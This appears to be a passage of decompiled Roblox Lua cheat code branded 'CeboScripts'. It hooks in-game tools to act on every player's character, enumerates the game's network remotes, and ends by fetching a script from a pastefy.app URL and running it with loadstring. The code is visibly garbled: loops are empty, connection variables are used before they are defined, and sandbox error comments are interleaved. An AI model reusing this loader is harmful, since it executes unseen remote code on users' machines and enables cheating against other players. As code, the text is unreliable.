		local HumanoidRootPart23 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		HumanoidRootPart23.Anchored = false
		HumanoidRootPart23.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
		HumanoidRootPart23.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
		local HumanoidRootPart24 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		HumanoidRootPart24.Anchored = false
		HumanoidRootPart24.Velocity = Vector3.new(0, HumanoidRootPart24.Velocity.Y, 0)
		HumanoidRootPart24.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
		HumanoidRootPart24.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
	end)

	local Head4 = character5:WaitForChild("Head", 5)
	local YoSpeed2 = Head4:FindFirstChild("YoSpeed")
	YoSpeed2:Destroy()
	local YoSpeed3 = Instance.new("BillboardGui")
	YoSpeed3.Name = "YoSpeed"
	YoSpeed3.Size = UDim2.new(0, 180, 0, 34)
	YoSpeed3.StudsOffset = Vector3.new(0, 1.6000000238418579, 0)
	YoSpeed3.AlwaysOnTop = true
	YoSpeed3.Parent = Head4
	local TextLabel32 = Instance.new("TextLabel", YoSpeed3)
	TextLabel32.Size = UDim2.new(1, 0, 1, 0)
	TextLabel32.BackgroundTransparency = 1
	TextLabel32.Text = "CeboScripts"
	TextLabel32.Font = Enum.Font.GothamBlack
	TextLabel32.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel32.TextSize = 20
	TextLabel32.TextStrokeTransparency = 0.15
	TextLabel32.TextStrokeColor3 = Color3.fromRGB(15, 2, 2)
	TextLabel32:GetChildren()
	local UIGradient51 = Instance.new("UIGradient")
	UIGradient51.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(160, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(75, 12, 12)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 4, 4)) })
	UIGradient51.Rotation = 90
	UIGradient51.Parent = TextLabel32
end)

local Head = Players.LocalPlayer.Character:WaitForChild("Head", 5)
local YoSpeed = Head:FindFirstChild("YoSpeed")
YoSpeed:Destroy()
local YoSpeed4 = Instance.new("BillboardGui")
YoSpeed4.Name = "YoSpeed"
YoSpeed4.Size = UDim2.new(0, 180, 0, 34)
YoSpeed4.StudsOffset = Vector3.new(0, 1.6000000238418579, 0)
YoSpeed4.AlwaysOnTop = true
YoSpeed4.Parent = Head
local TextLabel31 = Instance.new("TextLabel", YoSpeed4)
TextLabel31.Size = UDim2.new(1, 0, 1, 0)
TextLabel31.BackgroundTransparency = 1
TextLabel31.Text = "CeboScripts"
TextLabel31.Font = Enum.Font.GothamBlack
TextLabel31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel31.TextSize = 20
TextLabel31.TextStrokeTransparency = 0.15
TextLabel31.TextStrokeColor3 = Color3.fromRGB(15, 2, 2)
TextLabel31:GetChildren()
local UIGradient44 = Instance.new("UIGradient")
UIGradient44.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(160, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(75, 12, 12)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 4, 4)) })
UIGradient44.Rotation = 90
UIGradient44.Parent = TextLabel31

task.spawn(function(...)
	local Packages = ReplicatedStorage:FindFirstChild("Packages")
	local Net = Packages:FindFirstChild("Net")
	local children4 = Net:GetChildren()

	for i6, v6 in ipairs(children4) do
	end

	Net.ChildAdded:Connect(function(child6)
		task.defer(function()
		end)
	end)
end)

Players.LocalPlayer.CharacterAdded:Connect(function(character6)
	task.wait(0.3)
	local Backpack7 = Players.LocalPlayer:FindFirstChild("Backpack")
	local LaserCape = Backpack7:FindFirstChild("Laser Cape")

	local connection5 = LaserCape.Activated:Connect(function(inputObject6, clickCount2)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players4 = Players:GetPlayers()

		for i22, v23 in ipairs(players4) do
			v23.Character:FindFirstChildOfClass("Humanoid")
			v23.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)

	local Backpack8 = Players.LocalPlayer:FindFirstChild("Backpack")
	local WebSlinger4 = Backpack8:FindFirstChild("Web Slinger")

	local connection6 = WebSlinger4.Activated:Connect(function(inputObject7, clickCount3)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players5 = Players:GetPlayers()

		for i23, v24 in ipairs(players5) do
			v24.Character:FindFirstChildOfClass("Humanoid")
			v24.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)

	character6.ChildAdded:Connect(function(child14)
		task.wait(0.1)

		for _, item in ipairs({
			{ childName = "Laser Cape", connection11 = connection9 },
			{ childName = "Web Slinger", connection11 = connection10 },
		}) do
			local Backpack14 = Players.LocalPlayer:FindFirstChild("Backpack")
			local LaserCape4 = Backpack14:FindFirstChild(item.childName)
			item.connection11:Disconnect()

			LaserCape4.Activated:Connect(function(inputObject12, clickCount8)
				Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local players10 = Players:GetPlayers()

				for i28, v29 in ipairs(players10) do
					v29.Character:FindFirstChildOfClass("Humanoid")
					v29.Character:FindFirstChild("HumanoidRootPart")
				end
				-- [envlog] error: Script:2: attempt to compare number < userdata
			end)
		end
	end)
end)

Players.LocalPlayer.Character.ChildAdded:Connect(function(child7)
	task.wait(0.1)
	local Backpack9 = Players.LocalPlayer:FindFirstChild("Backpack")
	local LaserCape2 = Backpack9:FindFirstChild("Laser Cape")
	connection5:Disconnect()

	local connection7 = LaserCape2.Activated:Connect(function(inputObject8, clickCount4)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players6 = Players:GetPlayers()

		for i24, v25 in ipairs(players6) do
			v25.Character:FindFirstChildOfClass("Humanoid")
			v25.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)

	local Backpack10 = Players.LocalPlayer:FindFirstChild("Backpack")
	local WebSlinger5 = Backpack10:FindFirstChild("Web Slinger")
	connection6:Disconnect()

	local connection8 = WebSlinger5.Activated:Connect(function(inputObject9, clickCount5)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players7 = Players:GetPlayers()

		for i25, v26 in ipairs(players7) do
			v26.Character:FindFirstChildOfClass("Humanoid")
			v26.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)
end)

Players.LocalPlayer.Backpack.ChildAdded:Connect(function(child8)
	task.wait(0.1)
	local Backpack11 = Players.LocalPlayer:FindFirstChild("Backpack")
	local LaserCape3 = Backpack11:FindFirstChild("Laser Cape")
	connection7:Disconnect()

	local connection9 = LaserCape3.Activated:Connect(function(inputObject10, clickCount6)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players8 = Players:GetPlayers()

		for i26, v27 in ipairs(players8) do
			v27.Character:FindFirstChildOfClass("Humanoid")
			v27.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)

	local Backpack12 = Players.LocalPlayer:FindFirstChild("Backpack")
	local WebSlinger6 = Backpack12:FindFirstChild("Web Slinger")
	connection8:Disconnect()

	local connection10 = WebSlinger6.Activated:Connect(function(inputObject11, clickCount7)
		Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local players9 = Players:GetPlayers()

		for i27, v28 in ipairs(players9) do
			v28.Character:FindFirstChildOfClass("Humanoid")
			v28.Character:FindFirstChild("HumanoidRootPart")
		end
		-- [envlog] error: Script:2: attempt to compare number < userdata
	end)
end)

local response = game:HttpGet("https://pastefy.app/bfFQjy7S/raw")
loadstring(response)()
